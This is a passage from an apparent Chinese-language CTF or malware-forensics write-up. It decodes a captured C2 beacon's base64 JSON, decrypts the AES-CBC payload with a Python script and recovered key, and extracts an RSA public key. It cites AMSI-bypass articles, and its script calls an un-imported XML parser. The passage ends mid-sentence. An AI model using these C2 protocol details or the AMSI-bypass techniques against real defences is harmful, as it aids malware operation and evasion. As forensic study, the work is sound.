    i=a19ea23062db990386a3a478cb89d52e&data=eyJHVUlEIjoiNjllYmY5ZWRjNTRmMTI4ZjE4ODIiLCJUeXBlIjowLCJNZXRhIjoiIiwiSVYiOiJlWFFkSGtvbVIrQnV4ajVZRmM5d1lBPT0iLCJFbmNyeXB0ZWRNZXNzYWdlIjoiVWE2Uzd2amFmN2FrRm9jQjlsb2ZqaFEvN1JKWXVmVWkrbnBqVXFyYlZQSkVhVTcydk5USmdDcXNRYXMwSzhtZ1NDZWFVY2hKSU41MU96UndTMFowMURzN3Zad2FIYkNjaCtYREExUDdMc29VMkc2V0lzRXNrNGpleVB3eE1hTkg5d2hveXRsQkMxYTRLR2NFUmV1ZE5wQ2xQZWJlaHphQSs4ZmVSNE9KdUVxQmJ6dHdGbXJ1TzBaTnc5Nlh1bmsxaUJxUGZNczFYUWFWVDV0NXBMVFc0Sm9sN0pqYUZCRDJ0dEl2emphdFpVS2Uzam1rWFY2dC82WEIxWDY2dVRHNU9JTDlCb2ZvSlpZT2dzTEZWYUphLzVzeGVBUStvUCtMM2VFaS9BRjNOaUZFREZZbUtGZzlwTjRuVVdPUURET200TzlPbkpJWndiMm8wUVkrUkFuU0JMVDRaMGlyNXlkdFR4ejNUYkFuaWVMN3h0RXpPellEYVBHYVdHTmIvMUVPcWczRTlZRkl1OXlubzBrT3hpcnhUMVUzZHBNRTg4M1RqejBEdGVlZnN5U1ptU0d4a1oyNTllM0FrbG5FZ2NYenRDclE4Kys1VE1vUmthVTVTVzZ3SE1LUkNBLzdpditIaDIxa29OTExIQmlhMTZqRGtxNjdqRXE3Z1UwcDJRKzFpUUhxeGNCVThCZVpYekh6ZVVQYTEybXkzVVNyelhkME0yZHEwNzJ0TXlzPSIsIkhNQUMiOiJibHRucXpBakZTZUx5bFR6aGowSUhZcG80aldOeVVGWEVwbHFHcjQ1dmw4PSJ9&session=75db-99b1-25fe4e9afbe58696-320bea73
    ```
    最重要的就是data中的內容，實際decode如下
    ```json
    {
        "GUID": "69ebf9edc54f128f1882",
        "Type": 0,
        "Meta": "",
        "IV": "eXQdHkomR+Buxj5YFc9wYA==",
        "EncryptedMessage": "Ua6S7vjaf7akFocB9lofjhQ/7RJYufUi+npjUqrbVPJEaU72vNTJgCqsQas0K8mgSCeaUchJIN51OzRwS0Z01Ds7vZwaHbCch+XDA1P7LsoU2G6WIsEsk4jeyPwxMaNH9whoytlBC1a4KGcEReudNpClPebehzaA+8feR4OJuEqBbztwFmruO0ZNw96Xunk1iBqPfMs1XQaVT5t5pLTW4Jol7JjaFBD2ttIvzjatZUKe3jmkXV6t/6XB1X66uTG5OIL9BofoJZYOgsLFVaJa/5sxeAQ+oP+L3eEi/AF3NiFEDFYmKFg9pN4nUWOQDDOm4O9OnJIZwb2o0QY+RAnSBLT4Z0ir5ydtTxz3TbAnieL7xtEzOzYDaPGaWGNb/1EOqg3E9YFIu9yno0kOxirxT1U3dpME883Tjz0DteefsySZmSGxkZ259e3AklnEgcXztCrQ8++5TMoRkaU5SW6wHMKRCA/7iv+Hh21koNLLHBia16jDkq67jEq7gU0p2Q+1iQHqxcBU8BeZXzHzeUPa12my3USrzXd0M2dq072tMys=",
        "HMAC": "bltnqzAjFSeLylTzhj0IHYpo4jWNyUFXEplqGr45vl8="
    }
    ```
    我們既然知道AES的mode, padding, IV, key，是不是可以知道RSA的公鑰
    ```python
    import base64
    import json
    from urllib.parse import parse_qs
    from Crypto.Cipher import AES
    from Crypto.Hash import HMAC, SHA256

    # ===== 固定 AES key（你給的）=====
    KEY_B64 = "e+MPqFZXA52Kx1xuTPTK6M/HtJkjq/0dfBJUsSJfzQw="
    KEY = base64.b64decode(KEY_B64)

    # ===== PKCS7 unpad =====
    def pkcs7_unpad(data):
        pad_len = data[-1]
        return data[:-pad_len]

    # ===== 主解密函數 =====
    def decrypt_c2(raw_http_body):
        # 1️⃣ parse POST body
        parsed = parse_qs(raw_http_body)

        if "data" not in parsed:
            print("[!] data field not found")
            return

        data_b64 = parsed["data"][0]

        # 2️⃣ Base64 → JSON
        json_str = base64.b64decode(data_b64).decode()
        print("[+] JSON:\n", json_str)

        obj = json.loads(json_str)

        iv = base64.b64decode(obj["IV"])
        enc = base64.b64decode(obj["EncryptedMessage"])
        hmac_recv = base64.b64decode(obj["HMAC"])

        # 3️⃣ 驗證 HMAC
        h = HMAC.new(KEY, digestmod=SHA256)
        h.update(enc)

        try:
            h.verify(hmac_recv)
            print("[+] HMAC OK")
        except:
            print("[!] HMAC mismatch (可能不是第一階段資料)")
            return

        # 4️⃣ AES-CBC decrypt
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc)
        decrypted = pkcs7_unpad(decrypted)

        print("\n[+] Decrypted result:\n")
        try:
            print(decrypted.decode())
        except:
            print(decrypted)


    # ===== 測試 =====
    if __name__ == "__main__":
        raw = """i=a19ea23062db990386a3a478cb89d52e&data=eyJHVUlEIjoiNjllYmY5ZWRjNTRmMTI4ZjE4ODIiLCJUeXBlIjowLCJNZXRhIjoiIiwiSVYiOiJlWFFkSGtvbVIrQnV4ajVZRmM5d1lBPT0iLCJFbmNyeXB0ZWRNZXNzYWdlIjoiVWE2Uzd2amFmN2FrRm9jQjlsb2ZqaFEvN1JKWXVmVWkrbnBqVXFyYlZQSkVhVTcydk5USmdDcXNRYXMwSzhtZ1NDZWFVY2hKSU41MU96UndTMFowMURzN3Zad2FIYkNjaCtYREExUDdMc29VMkc2V0lzRXNrNGpleVB3eE1hTkg5d2hveXRsQkMxYTRLR2NFUmV1ZE5wQ2xQZWJlaHphQSs4ZmVSNE9KdUVxQmJ6dHdGbXJ1TzBaTnc5Nlh1bmsxaUJxUGZNczFYUWFWVDV0NXBMVFc0Sm9sN0pqYUZCRDJ0dEl2emphdFpVS2Uzam1rWFY2dC82WEIxWDY2dVRHNU9JTDlCb2ZvSlpZT2dzTEZWYUphLzVzeGVBUStvUCtMM2VFaS9BRjNOaUZFREZZbUtGZzlwTjRuVVdPUURET200TzlPbkpJWndiMm8wUVkrUkFuU0JMVDRaMGlyNXlkdFR4ejNUYkFuaWVMN3h0RXpPellEYVBHYVdHTmIvMUVPcWczRTlZRkl1OXlubzBrT3hpcnhUMVUzZHBNRTg4M1RqejBEdGVlZnN5U1ptU0d4a1oyNTllM0FrbG5FZ2NYenRDclE4Kys1VE1vUmthVTVTVzZ3SE1LUkNBLzdpditIaDIxa29OTExIQmlhMTZqRGtxNjdqRXE3Z1UwcDJRKzFpUUhxeGNCVThCZVpYekh6ZVVQYTEybXkzVVNyelhkME0yZHEwNzJ0TXlzPSIsIkhNQUMiOiJibHRucXpBakZTZUx5bFR6aGowSUhZcG80aldOeVVGWEVwbHFHcjQ1dmw4PSJ9&session=75db-99b1-25fe4e9afbe58696-320bea73"""

        xml_data = decrypt_c2(raw)
        root = ET.fromstring(xml_data)
        
        mod = int(base64.b64decode(root.find("Modulus").text).hex(), 16)
        exp = int(base64.b64decode(root.find("Exponent").text).hex(), 16)

        print("\n[+] Modulus:", mod)
        print("[+] Exponent:", exp)
    ```
    實際執行如下
    ```bash
    $ python decrypt_rsa_pub.py
    [+] JSON:
    {"GUID":"69ebf9edc54f128f1882","Type":0,"Meta":"","IV":"eXQdHkomR+Buxj5YFc9wYA==","EncryptedMessage":"Ua6S7vjaf7akFocB9lofjhQ/7RJYufUi+npjUqrbVPJEaU72vNTJgCqsQas0K8mgSCeaUchJIN51OzRwS0Z01Ds7vZwaHbCch+XDA1P7LsoU2G6WIsEsk4jeyPwxMaNH9whoytlBC1a4KGcEReudNpClPebehzaA+8feR4OJuEqBbztwFmruO0ZNw96Xunk1iBqPfMs1XQaVT5t5pLTW4Jol7JjaFBD2ttIvzjatZUKe3jmkXV6t/6XB1X66uTG5OIL9BofoJZYOgsLFVaJa/5sxeAQ+oP+L3eEi/AF3NiFEDFYmKFg9pN4nUWOQDDOm4O9OnJIZwb2o0QY+RAnSBLT4Z0ir5ydtTxz3TbAnieL7xtEzOzYDaPGaWGNb/1EOqg3E9YFIu9yno0kOxirxT1U3dpME883Tjz0DteefsySZmSGxkZ259e3AklnEgcXztCrQ8++5TMoRkaU5SW6wHMKRCA/7iv+Hh21koNLLHBia16jDkq67jEq7gU0p2Q+1iQHqxcBU8BeZXzHzeUPa12my3USrzXd0M2dq072tMys=","HMAC":"bltnqzAjFSeLylTzhj0IHYpo4jWNyUFXEplqGr45vl8="}
    [+] HMAC OK

    [+] Decrypted result: <RSAKeyValue><Modulus>whTIf58LseBXkJ10h+oHQ0uSAG9N1oOgQwttHx9ZV/Vu4dhF5hkK0OdF8vX2/Qu6dNBtWRR4y5xJe9GpdswudB+lSClET9nFFAc50o8l57v8or71D/qvY2y+SFiyfDKUWqcL86QJW0w4cio2XfvKyT7X+RSIZ25YT7KFvv150K65uAR9JOZPGy2SQy/LJU7TgbgipyjOQmQ1m6NOHSrlRUst9mc3KDJ9BFXENxee35lPTvr0+EJmA/BXZNqlXO3ZX0Jrt8/WuP0zSxtyJk8Kq8Mukw8PfKApWmYK9t3sOTuADxE+2ixjlKvBQUlYYFgW5mPB9WgqkxKGDZ+4yVO0GQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>

    [+] Modulus (hex): c214c87f9f0bb1e057909d7487ea07434b92006f4dd683a0430b6d1f1f5957f56ee1d845e6190ad0e745f2f5f6fd0bba74d06d591478cb9c497bd1a976cc2e741fa54829444fd9c5140739d28f25e7bbfca2bef50ffaaf636cbe4858b27c32945aa70bf3a4095b4c38722a365dfbcac93ed7f91488676e584fb285befd79d0aeb9b8047d24e64f1b2d92432fcb254ed381b822a728ce4264359ba34e1d2ae5454b2df6673728327d0455c437179edf994f4efaf4f8426603f05764daa55cedd95f426bb7cfd6b8fd334b1b72264f0aabc32e930f0f7ca0295a660af6ddec393b800f113eda2c6394abc1414958605816e663c1f5682a9312860d9fb8c953b419
    [+] Exponent (hex): 010001

    [+] Modulus: 24500479739996401095963273339592726854577544361336131010257542521022211129981853493393225360519803579604180308554466001731317155662883901804401782188521087339814875281675433970241173004066302505438642828635010456006385052201037045477318965992934329299311444091059748284959353737140967032070288032300860660201615096014919515126279357598150050824813778543505190552347761162077192178028816763336284205055962774977565719957750667189548431231956870852091820940013123547790813584160727972414802494322174845231209532274329179771734167199910578449745231446017777892612369264412397522087533293707026498164641181074706780107801
    [+] Exponent: 65537
    ```
7. 到這邊最理想的解法是破解RSA Private Key，所以必須拿到`p, q`，不過也有另外一個想法，既然我們有minidump的memory，那就代表實際的malicious已經被decrypt放在memory，那就代表

## Reference
[^1]:[AMSI 淺析及繞過](https://www.cnblogs.com/bonelee/p/16221958.html): 基本上中國的文章搬來搬去，也不確定哪裡才是原文
[^2]:[AMSI Bypass With PowerShell](https://medium.com/@0xjbr1/amsi-bypass-with-powershell-37ab120ce25a)